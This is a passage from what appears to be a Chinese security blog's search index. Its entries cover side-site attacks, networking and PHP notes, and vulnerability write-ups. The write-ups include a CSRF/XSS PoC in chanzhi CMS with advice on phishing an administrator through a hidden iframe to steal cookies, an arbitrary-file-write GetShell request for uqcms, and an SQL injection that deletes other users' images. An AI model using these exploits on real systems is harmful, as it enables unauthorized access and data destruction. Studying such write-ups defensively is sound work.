      
      
    </entry>
    
    <entry>
      <title>TP5入口文件</title>
      <link href="/2018/06/06/%5BTP5%5D%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6/"/>
      <url>/2018/06/06/%5BTP5%5D%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6/</url>
      <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5框架 </tag>
            
            <tag> 网站开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>旁注攻击</title>
      <link href="/2018/06/05/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/"/>
      <url>/2018/06/05/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<blockquote><p>旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透如，从而获取目标站点的权限，这过程就是旁注攻击</p></blockquote><a id="more"></a><p>简单的举个栗子，比如一个服务器有如下站点:<br><img src="http://static.zybuluo.com/1kbfree/s4019xggzf82sjiesayzxa6t/image_1cf848h6c1b4v1sflqph1dsuvee39.png" alt="image_1cf848h6c1b4v1sflqph1dsuvee39.png-29.4kB"></p><p>当攻击者在攻击<code>www.iamfree.a</code>的时候，没有发现漏洞，无法拿下此站点，那么攻击者就可以通过攻击<code>www.iamfree.b</code>并且成功攻破，得到了<code>Root</code>权限，那么这里不但<code>www.iamfree.a</code>的数据会被泄露，<code>www.iamfree.b</code>的数据也同样会被泄露，而<code>www.iamfree.c</code>网站是不会受到影响的。因为他不与<code>www.iamfree.b</code>在同一个数据库。但也不是说绝对的安全的，攻击者也可以通过数据库提权的方式获取到服务器管理员的权限，从而获取<code>Access</code>数据库里的内容。</p><p>大网站也存在有旁注攻击的风险，比如:<code>qq.com</code>，他有很多子域名，如图<br><img src="http://static.zybuluo.com/1kbfree/3ymscqzouadvamtxr9wqmksd/image_1cf87ar7nnmbtli1hkf1kk615l1p.png" alt="image_1cf87ar7nnmbtli1hkf1kk615l1p.png-98.3kB"><br>如此多的子域名，不可能说每个站点都一定是安全的，所以我们可以子域名来渗透到主域名。</p><p>那么疑问来了，攻击者怎么知道目标服务器上放置了哪些网站呢？这时候就要用到 IP逆向查询了。</p><h2 id="IP逆向查询"><a href="#IP逆向查询" class="headerlink" title="IP逆向查询"></a>IP逆向查询</h2><p>在线查询服务器下有哪些站点的网站：</p><ol><li><p><a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank" rel="noopener">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a></p><p> <img src="http://static.zybuluo.com/1kbfree/ogrcrpiw8jki4zges4vn72zt/image_1cf87suv9132qtfno5u1r45o1h19.png" alt="image_1cf87suv9132qtfno5u1r45o1h19.png-92.9kB"></p></li><li><p><a href="http://s.tool.chinaz.com/same/" target="_blank" rel="noopener">http://s.tool.chinaz.com/same/</a> </p><p> <img src="http://static.zybuluo.com/1kbfree/9yslwjvp37ru93imr1t5zudg/image_1cf882dr5bhesnp1k0vjb11vnf1m.png" alt="image_1cf882dr5bhesnp1k0vjb11vnf1m.png-70.9kB"></p></li><li><p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></p><p> <img src="http://static.zybuluo.com/1kbfree/980cklf2mepmb5tjm3hiko5h/image_1cf884g691g28qut1uurvhj1dt123.png" alt="image_1cf884g691g28qut1uurvhj1dt123.png-46.8kB"></p></li><li><p>利用必应搜索引擎来IP逆向查询</p><p> <img src="http://static.zybuluo.com/1kbfree/yiiumoj9256s3tkbcirk2xmz/image_1cf88fe7b1p8e17ngah47pi7ok2g.png" alt="image_1cf88fe7b1p8e17ngah47pi7ok2g.png-133.1kB"></p></li></ol><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 旁站攻击 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>对chanzhi企业门户系统的一次测试</title>
      <link href="/2018/06/04/%E5%AF%B9chanzhi%E4%BC%81%E4%B8%9A%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/"/>
      <url>/2018/06/04/%E5%AF%B9chanzhi%E4%BC%81%E4%B8%9A%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>系统官网:<a href="http://www.chanzhi.org/?v=7.0.1" target="_blank" rel="noopener">http://www.chanzhi.org/?v=7.0.1</a><br>安装步骤之类的就省去了，直接开始测试</p></blockquote><a id="more"></a><h2 id="Csrf-Xss漏洞"><a href="#Csrf-Xss漏洞" class="headerlink" title="Csrf+Xss漏洞"></a>Csrf+Xss漏洞</h2><h3 id="漏洞复现过程："><a href="#漏洞复现过程：" class="headerlink" title="漏洞复现过程："></a>漏洞复现过程：</h3><p><strong>漏洞处:后台-&gt;内容-&gt;维护目录( <code>www.yousite.xxx/www/admin.php?m=tree&amp;f=browse&amp;type=article</code> )</strong><br><img src="http://static.zybuluo.com/1kbfree/1eqczzj0lmvp5bx7cuytacx7/image_1cf22p9ph1h001c11c48en41udv9.png" alt="image_1cf22p9ph1h001c11c48en41udv9.png-88kB"></p><h3 id="尝试输入一些恶意代码"><a href="#尝试输入一些恶意代码" class="headerlink" title="尝试输入一些恶意代码:"></a>尝试输入一些恶意代码:</h3><p><img src="http://static.zybuluo.com/1kbfree/9jkepe0movhb3wqnogdp3q72/image_1cf22sib1r2s1gmr1ef91jdobl3m.png" alt="image_1cf22sib1r2s1gmr1ef91jdobl3m.png-94kB"><br><em>这里因为发现没有过滤，所以存在Xss漏洞，但是这里我们是不可能插入的(除非管理员自己插入的，那么，我们就来看看有没有Csrf漏洞可以结合一下)，然后就想着用<code>Burp</code>抓包分析一下，发现有戏~</em></p><h3 id="用Burp抓包分析一波，并且放入Repeater模块"><a href="#用Burp抓包分析一波，并且放入Repeater模块" class="headerlink" title="用Burp抓包分析一波，并且放入Repeater模块"></a>用Burp抓包分析一波，并且放入Repeater模块</h3><p><img src="http://static.zybuluo.com/1kbfree/kamwo6vjibi723vy6xsftfpj/image_1cf234ih41j9j13q81fui1vt61e4613.png" alt="image_1cf234ih41j9j13q81fui1vt61e4613.png-179.2kB"><br><em>这里并没有发现有<code>Token</code>验证，那么我们来利用<code>Burp</code>自带的生成<code>Csrf Poc</code></em></p><ol><li><p>右键-&gt;Engagement tools-&gt;Generate Csrf PoC<br> <img src="http://static.zybuluo.com/1kbfree/spy3dawa6wefouk801yjbmmy/image_1cf238hq59dd17s81hmc19fo17de1g.png" alt="image_1cf238hq59dd17s81hmc19fo17de1g.png-200.7kB"></p></li><li><p>自动写出PoC，我们直接复制到本地的HTML文件里<br> <img src="http://static.zybuluo.com/1kbfree/z77f48e487ibum2kzqzgtbyg/image_1cf23afcu47711rc1f8dda51td81t.png" alt="image_1cf23afcu47711rc1f8dda51td81t.png-130.6kB"><br> <img src="http://static.zybuluo.com/1kbfree/ia6pgpvoujwmaiubnvr32dac/image_1cf23be0010jv2trk20h981fa32a.png" alt="image_1cf23be0010jv2trk20h981fa32a.png-166.1kB"></p></li><li><p>在浏览器中打开这个生成的PoC<br> <img src="http://static.zybuluo.com/1kbfree/bi0vt6ds8xk4tjja26jatavc/image_1cf23jr1ahr71q7oh512dkthq51.png" alt="image_1cf23jr1ahr71q7oh512dkthq51.png-32.9kB"><br> <img src="http://static.zybuluo.com/1kbfree/akzoa6mwnynhh9alfkz5z27d/image_1cf23er16or4g0a18gh18ap7a22n.png" alt="image_1cf23er16or4g0a18gh18ap7a22n.png-78.5kB"><br> <img src="http://static.zybuluo.com/1kbfree/zodoc27hx19hevz7zi2yu7yz/image_1cf23lrb4153tkd2123m1v988p85e.png" alt="image_1cf23lrb4153tkd2123m1v988p85e.png-81.4kB"><br> <em>ok，存在Csrf漏洞</em></p></li></ol><blockquote class="blockquote-center"><p>我们可以利用社工来把这个文件发送给管理员，如果管理员选择了打开的话那么就可以盗取他的Cookie了，那么很多人会问，管理员看到这样的界面肯定会不点击啦，那么我给你一个思路，就是把csrf_poc的代码放在 1.html 文件( 把点击提交修改为自动提交 )，然后把2.html文件用 iframe标签把 1.html 文件嵌入 并且把iframe标签透明度设置为100%，那么管理员打开后就会自动提交表单并且不会展示在2.html页面上~~~</p></blockquote><hr><blockquote><p>本来还想写另一个漏洞的，可惜无法绕过，实属能力有限</p></blockquote><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Xss </tag>
            
            <tag> Csrf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>uqcms的后台GetShell和前台越权删除他人图片</title>
      <link href="/2018/06/03/uqcms%E7%9A%84%E5%90%8E%E5%8F%B0GetShell%E5%92%8C%E5%89%8D%E5%8F%B0%E8%B6%8A%E6%9D%83%E5%88%A0%E9%99%A4%E4%BB%96%E4%BA%BA%E5%9B%BE%E7%89%87/"/>
      <url>/2018/06/03/uqcms%E7%9A%84%E5%90%8E%E5%8F%B0GetShell%E5%92%8C%E5%89%8D%E5%8F%B0%E8%B6%8A%E6%9D%83%E5%88%A0%E9%99%A4%E4%BB%96%E4%BA%BA%E5%9B%BE%E7%89%87/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>qucms是一个B2B2C多商户电商系统 </p><p>结合多年的电商开发经验推出B2B2C多店铺系统，是目前国内最优秀的电商平台之一，系统设计为“平台自营+供应商入驻”的电商运营模式，系统支持佣金结算、区域团购、实时物流、售后服务等基础功能；为电商运营商提供最优质的系统和服务。 该程序采用非常流行的PHP作为开发语言，给很多广大开发者一个容易上手，能快速进入业务，成熟的语言架构，去除无用直达高效的设计，给企业快速开发，赢的市场。</p></blockquote><a id="more"></a><h2 id="1-后台GETSHELL"><a href="#1-后台GETSHELL" class="headerlink" title="1. 后台GETSHELL"></a>1. 后台GETSHELL</h2><p><strong>打开URL<code>www.yousite.xxx?m=template</code>后，呈现这个页面:</strong><br><img src="http://static.zybuluo.com/1kbfree/5rhe8dglshi1f6zo2a6zcx30/image_1cevu8mj382u1blhvnl1eqk1nri9.png" alt="image_1cevu8mj382u1blhvnl1eqk1nri9.png-43.8kB"><br><em>点击进入目录</em></p><p><img src="http://static.zybuluo.com/1kbfree/m3qpdsjbtli4b0yuvfagnca7/image_1cevua1je1t93pa7cfj127jhv16.png" alt="image_1cevua1je1t93pa7cfj127jhv16.png-95.5kB"><br><em>随便点击一个编辑，然后用<code>Burp</code>抓包( 用不用都可以 )</em></p><p><img src="http://static.zybuluo.com/1kbfree/skmc2jt9ydxst5v8qx5lxvp3/image_1cevuf2drd8t1l1e56evn31otg1j.png" alt="image_1cevuf2drd8t1l1e56evn31otg1j.png-106.9kB"><br><em>单击提交后用<code>Burp</code>抓包，抓到的数据如下图</em></p><p><img src="http://static.zybuluo.com/1kbfree/q1zt5b9wfa8pzw3ulz1xo01v/image_1cevuh0soqt1imm1icg43m13h820.png" alt="image_1cevuh0soqt1imm1icg43m13h820.png-173.1kB"><br><em>我们将<code>filename</code>修改为<code>phpinfo.php</code>，把<code>content</code>修改为<code>&lt;?php phpinfo();?&gt;</code></em></p><p><img src="http://static.zybuluo.com/1kbfree/9nm6cx6hllfsnm3jxnfax44k/image_1cevuk0f31pddmhhphu1urj1nvn2d.png" alt="image_1cevuk0f31pddmhhphu1urj1nvn2d.png-52.6kB"></p><p><strong>修改后的数据包:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php?m=template&amp;a=save&amp;jq_time=1527933067821 HTTP/1.1</span><br><span class="line">Host: www.iamfree.ccc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://www.iamfree.ccc/admin.php?m=template&amp;a=edit&amp;path=default.top.html</span><br><span class="line">Content-Length: 2886</span><br><span class="line">Cookie: PHPSESSID=b3uto19lpaa0mbbg4rudn9oqt0; goods[cart]=180602173948571025</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">filename=phpinfo.php&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p>然后就会在根目录创建一个名为<code>phpinfo.php</code>的文件，并且内容为<code>&lt;?php phpinfo();?&gt;</code><br><img src="http://static.zybuluo.com/1kbfree/mhq7mmwnvatnrtklvuaojrp3/image_1cevur2sr1nri103u1pss15mf19l92q.png" alt="image_1cevur2sr1nri103u1pss15mf19l92q.png-80.8kB"></p><p><strong>访问<code>phpinfo.php</code>文件，完成GETSHELL</strong>:<br><img src="http://static.zybuluo.com/1kbfree/hs1ow8zedgcsb9tky3sgqsv8/image_1cevuscb0g0i1ccj146918t61n9837.png" alt="image_1cevuscb0g0i1ccj146918t61n9837.png-75.1kB"></p><h3 id="漏洞代码处："><a href="#漏洞代码处：" class="headerlink" title="漏洞代码处："></a>漏洞代码处：</h3><p><img src="http://static.zybuluo.com/1kbfree/z49nss7cfztsupiae1uwdb9j/image_1cevvbsg4vo29pi19jcmst1ftd3k.png" alt="image_1cevvbsg4vo29pi19jcmst1ftd3k.png-147kB"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_POST) &#123;</span><br><span class="line">            $file = P(<span class="string">'filename'</span>, <span class="string">'修改的文件名不能为空'</span>);</span><br><span class="line">            $content = P(<span class="string">'content'</span>);</span><br><span class="line">            $query = file_put_contents($file, stripslashes_deep($content)); </span><br><span class="line">            <span class="keyword">if</span> ($query) &#123;</span><br><span class="line">                right_json();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                error_json(<span class="string">'保存失败'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error_json(<span class="string">'提交错误'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h4 id="加上这三段代码，便于调试"><a href="#加上这三段代码，便于调试" class="headerlink" title="加上这三段代码，便于调试"></a>加上这三段代码，便于调试</h4><p><img src="http://static.zybuluo.com/1kbfree/qa4imhcw08688ryzb25skm9x/image_1cevvi0dl17hnhst1nns4j91n3m4h.png" alt="image_1cevvi0dl17hnhst1nns4j91n3m4h.png-47.8kB"></p><h4 id="把Burp抓的包放到Repeater-按住ctrl-r-模块里"><a href="#把Burp抓的包放到Repeater-按住ctrl-r-模块里" class="headerlink" title="把Burp抓的包放到Repeater( 按住ctrl+r )模块里"></a>把<code>Burp</code>抓的包放到<code>Repeater</code>( 按住ctrl+r )模块里</h4><p><img src="http://static.zybuluo.com/1kbfree/m9ajlrc4vc6w6v36utocmlpm/image_1cevvkj3gt54godvddo68q434u.png" alt="image_1cevvkj3gt54godvddo68q434u.png-82.5kB"><br><em><code>file_put_contents</code></em>的返回值是第二个参数的长度</p><p><em>这里因为没有做任何过滤，所以这里导致了任意文件写入漏洞</em></p><h2 id="前台任意删除他人图片"><a href="#前台任意删除他人图片" class="headerlink" title="前台任意删除他人图片:"></a>前台任意删除他人图片:</h2><h3 id="漏洞处"><a href="#漏洞处" class="headerlink" title="漏洞处:"></a>漏洞处:</h3><ol><li><p>进入商家登陆<br><img src="http://static.zybuluo.com/1kbfree/3j8beyrhld9vq3fyv0pnmf3z/image_1cf0ctl1g1rj513371i61v5k5bv9.png" alt="image_1cf0ctl1g1rj513371i61v5k5bv9.png-482.6kB"></p></li><li><p>登陆后，单击装修<br><img src="http://static.zybuluo.com/1kbfree/5d2bkrbuyrblhiloj4yqhl8r/image_1cf0cuvu7f2225011akh3n6egm.png" alt="image_1cf0cuvu7f2225011akh3n6egm.png-40.9kB"></p></li><li><p>点击相册列表，并且上传图片<br><img src="http://static.zybuluo.com/1kbfree/6gml7d0kw30alawf5a3vixo0/image_1cf0d0f9r10p21rrm14pk576i213.png" alt="image_1cf0d0f9r10p21rrm14pk576i213.png-56.5kB"></p></li></ol><h3 id="漏洞讲解开始"><a href="#漏洞讲解开始" class="headerlink" title="漏洞讲解开始"></a>漏洞讲解开始</h3><p><strong>首先选择这个ID为<code>1566</code>的那张图片点击删除，并且用<code>Burp</code>进行抓包:</strong><br><img src="http://static.zybuluo.com/1kbfree/p0q1340u6cna6wtqcehdvrdm/image_1cf0d48umhlifkd10g9poj17vf20.png" alt="image_1cf0d48umhlifkd10g9poj17vf20.png-73.2kB"></p><p><strong>我们首先随便输入一下错误的语法( 方便看到他的执行了什么语句 ):</strong><br><img src="http://static.zybuluo.com/1kbfree/vs6qmp1rqhgtwtxujf008arj/image_1cf0d6kkfr7518cvk5lm1t1bja2d.png" alt="image_1cf0d6kkfr7518cvk5lm1t1bja2d.png-80kB"></p><p>可以看到他执行的SQL语句是:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,shop_id,<span class="keyword">url</span> <span class="keyword">from</span> uq_album <span class="keyword">where</span> shop_id = <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">id</span> = <span class="number">1566</span> <span class="keyword">or</span> xxxx #查询uq_album表中条件为shop_id=<span class="number">4</span>与<span class="keyword">id</span>=<span class="number">1566</span>的<span class="keyword">id</span>和shop_id和<span class="keyword">url</span></span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/1kbfree/07cx81dknqfgq9z6nlp53bpk/image_1cf0e57anq5rjs1131tj431m6u2q.png" alt="image_1cf0e57anq5rjs1131tj431m6u2q.png-81.6kB"></p><p>我们现在身为<code>test2</code>想把<code>test1</code>的图片删了，那么我们就构造一下sql语句~</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,shop_id,<span class="keyword">url</span> <span class="keyword">from</span> uq_album <span class="keyword">where</span> shop_id = <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">id</span> = <span class="number">1566</span> <span class="keyword">or</span> shop_id <span class="keyword">in</span> (<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/0smw4ibe5qo15yet4wb62hv5/image_1cf0ea13g1oag25u1st01dsk1oob37.png" alt="image_1cf0ea13g1oag25u1st01dsk1oob37.png-19.6kB"></p><p><em>可以看见这里有3条数据被展现出来了，也就是<code>test2</code>上传的图片</em><br><img src="http://static.zybuluo.com/1kbfree/z88pbselrnp64czvlxvzvz52/image_1cf0ehv65i57hfmpth1qdjct3k.png" alt="image_1cf0ehv65i57hfmpth1qdjct3k.png-84kB"></p><p><strong>然后我们开始执行一下这个构造的<code>SQL</code>语句:</strong><br><img src="http://static.zybuluo.com/1kbfree/mlqrnissvouj49pwufitq5ak/image_1cf0em241145v1nd7lg11femt0a41.png" alt="image_1cf0em241145v1nd7lg11femt0a41.png-77.6kB"></p><p><strong>然后我们发现那3条数据就没了:</strong><br><img src="http://static.zybuluo.com/1kbfree/yjcup6bc7ouudlnnpd1tb9bl/image_1cf0emvus1lq91rm6fls17jpfq04u.png" alt="image_1cf0emvus1lq91rm6fls17jpfq04u.png-41.6kB"></p><h3 id="代码处"><a href="#代码处" class="headerlink" title="代码处:"></a>代码处:</h3><blockquote><p>下次补 手机已经扣了4元了 出不起了 </p></blockquote><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 0day </tag>
            
            <tag> Cms漏洞挖掘 </tag>
            
            <tag> 白盒审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>OSI七层模型</title>
      <link href="/2018/05/27/OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"/>
      <url>/2018/05/27/OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/</url>
      <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 思科认证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSI七成模型 </tag>
            
            <tag> 网络设备 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>计算机是如何访问网站的</title>
      <link href="/2018/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E7%9A%84/"/>
      <url>/2018/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E7%9A%84/</url>
      <content type="html"><![CDATA[<div class="note danger"><p>我们都知道，计算机访问网站是通过域名( <a href="http://www.xxx.xxx" target="_blank" rel="noopener">www.xxx.xxx</a> )来访问一个网站的，其实并不是，下面我来讲解一下</p></div><a id="more"></a><h2 id="计算机是如何通过域名来访问一个网站的"><a href="#计算机是如何通过域名来访问一个网站的" class="headerlink" title="计算机是如何通过域名来访问一个网站的"></a>计算机是如何通过域名来访问一个网站的</h2><p><strong>其实在很久以前中，是用 IP 来直接访问网站的，但是因为 IP 的数字过长，又不好记，所以现在都改用 <a href="http://www.xxx.xxx" target="_blank" rel="noopener">www.xxx.xxx</a> 的形式访问网站了，也就是域名，我们先来看看用 IP 来访问百度:</strong></p><p>我们先打开CMD，输入命令<code>ping www.baidu.com</code>:<br><img src="http://static.zybuluo.com/1kbfree/i0ns2hg2h3l5luvqcapyuh8k/image_1cefrtdo91nmdb45n0124019ua9.png" alt="image_1cefrtdo91nmdb45n0124019ua9.png-55.5kB"><br><em>可以看到百度的 IP 地址是<code>183.232.231.172</code>，我们用浏览器访问一下</em></p><p><img src="http://static.zybuluo.com/1kbfree/mxy68596adn0h5ifpo6uvbgk/image_1cefrvdhk1d7u1ecgjdbl47kb0m.png" alt="image_1cefrvdhk1d7u1ecgjdbl47kb0m.png-221.1kB"><br><em>可以看到这2个是一样的，那么下面就来说说原理</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h3><blockquote class="blockquote-center"><p>域名解析服务，简单的说网络的地址是数字组成的，例如百度的服务器地址是<code>183.232.231.172</code>，我们的电脑通过这个地址访问百度，但是这个数字记忆起来相当麻烦，于是就有了<a href="http://www.baidu.com这个更直观的表示方法，DNS就是连接这两者的服务。" target="_blank" rel="noopener">www.baidu.com这个更直观的表示方法，DNS就是连接这两者的服务。</a></p></blockquote><p>也就是说，当我们每次访问<code>www.baidu.com</code>的时候，它就会去找Dns服务器，下面我来做一个对话,也就是DNS域名解析过程：</p><p><em>算了我不说了，直接看图吧~(把这里的<code>www.163.com</code>看成是<code>www.baidu.com</code>，把那个<code>1.1.1.1</code>看成<code>183.232.231.172</code>)</em><br>![image_1cefsiau26771tmn9t911471pnb13.png-571.3kB]<a href="选自CSDN">3</a></p><p>接着可以看这个文章: <a href="https://blog.csdn.net/cloudox_/article/details/69669035" target="_blank" rel="noopener">https://blog.csdn.net/cloudox_/article/details/69669035</a> (我感觉我讲的肯定没他好，我不擅长表达这些概念上的知识，哈哈哈，其实是为了找借口溜~v~)</p><p>也就是说，当我们每次访问<code>www.baidu.com</code>的时候，它就会去找Dns服务器，下面我来做一个对话,也就是DNS域名解析过程：</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> Dns </tag>
            
            <tag> 必修课 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nmap使用笔记</title>
      <link href="/2018/05/26/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/05/26/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。</p></blockquote><p>从上面那句话中，可见信息收集是多么的重要，因此，<code>Nmap</code>成为渗透中不可少的神器</p><a id="more"></a><h1 id="Nmap在网络扫描中常见作用"><a href="#Nmap在网络扫描中常见作用" class="headerlink" title="Nmap在网络扫描中常见作用:"></a>Nmap在网络扫描中常见作用:</h1><ol><li>查看存活的主机</li><li>扫描目标主机开放端口</li><li>鉴定安全过滤机制</li><li>识别目标主机的操作系统</li><li>查看目标主机的服务banner</li><li>利用脚本扫描漏洞</li></ol><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP函数记录</title>
      <link href="/2018/05/26/PHP%E5%87%BD%E6%95%B0%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/05/26/PHP%E5%87%BD%E6%95%B0%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<div class="note info"><p>持续更新中,此笔记正确食用方式是用于学习与代码审计~</p></div><a id="more"></a><hr><p>不显示错误信息:<code>error_reporting(0)</code></p><p>文件包含函数:<code>include()、include_once()、require()、require_once()</code></p><p>开启session:<code>session_start()</code></p><p>是否开启了gpc功能:<code>if( !get_magic_quotes_gpc() ){}</code></p><p>过滤函数:<code>addslashes()</code>入敏感的内容会被转义(\)</p><hr><p><strong>等号用处分类：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、=：赋值，在逻辑运算时也有效；</span><br><span class="line"></span><br><span class="line">2、==：等于运算，但是不比较值的类型；</span><br><span class="line"></span><br><span class="line">3、===：完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。</span><br></pre></td></tr></table></figure></p><hr><p><strong>chdir用法:</strong></p><p><img src="http://static.zybuluo.com/1kbfree/z9hjzdocsf3qe8tbas1qc0hf/image_1cdp74hqt1rgd9ln1rgv736man9.png" alt="image_1cdp74hqt1rgd9ln1rgv736man9.png-28.3kB"></p><hr><p><strong>mkdir用法:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mkdir(<span class="string">'1.iamfree'</span>) <span class="comment">//会在当前目录下创建一个1.iamfree文件夹</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><p><strong>const用法：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">const</span> name=<span class="string">'iamfree'</span>;</span><br><span class="line">    <span class="keyword">echo</span> name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出:iamfree</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><hr><p><strong>htmlspecialchars()函数：</strong><br><img 